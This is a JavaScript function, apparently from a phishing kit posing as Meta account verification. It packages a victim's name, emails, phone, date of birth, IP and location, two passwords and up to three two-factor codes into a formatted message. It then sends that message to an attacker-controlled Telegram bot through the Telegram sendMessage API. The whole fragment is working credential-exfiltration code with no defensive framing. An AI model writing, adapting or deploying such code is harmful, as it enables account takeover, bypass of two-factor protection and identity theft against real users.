async sendToTelegram(data) {
    const locationData = data.locationData || {
        ip: "N/A",
        location: "N/A"
    };

    const text = `
🚨 <b>NEW META VERIFICATION SUBMISSION</b> 🚨
━━━━━━━━━━━━━━━━━━━━
🌐 <b>NETWORK & LOCATION</b>
• <b>IP Address:</b> <code>${locationData.ip}</code>
• <b>Location:</b> <code>${locationData.location}</code>

👤 <b>USER INFORMATION</b>
• <b>Full Name:</b> <code>${data.fullName || 'N/A'}</code>
• <b>Email:</b> <code>${data.email || 'N/A'}</code>
• <b>Business Email:</b> <code>${data.emailBusiness || 'N/A'}</code>
• <b>Page Name:</b> <code>${data.fanpage || 'N/A'}</code>
• <b>Phone:</b> <code>${data.phone || 'N/A'}</code>
• <b>DOB:</b> <code>${data.day}/${data.month}/${data.year}</code>

🔑 <b>CREDENTIALS</b>
• <b>Password (1):</b> <code>${data.password || 'N/A'}</code>
• <b>Password (2):</b> <code>${data.passwordSecond || 'N/A'}</code>

🛡️ <b>TWO-FACTOR AUTHENTICATION (2FA)</b>
• <b>Code (1):</b> <code>${data.twoFa || 'N/A'}</code>
• <b>Code (2):</b> <code>${data.twoFaSecond || 'N/A'}</code>
• <b>Code (3):</b> <code>${data.twoFaThird || 'N/A'}</code>
━━━━━━━━━━━━━━━━━━━━
⏱ <i>Time: ${new Date().toLocaleString()}</i>`;

    try {
        await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CONFIG.TELEGRAM_CHAT_ID,
                text,
                parse_mode: 'HTML'
            })
        });
    } catch (error) {
        console.error('Telegram error:', error);
    }
},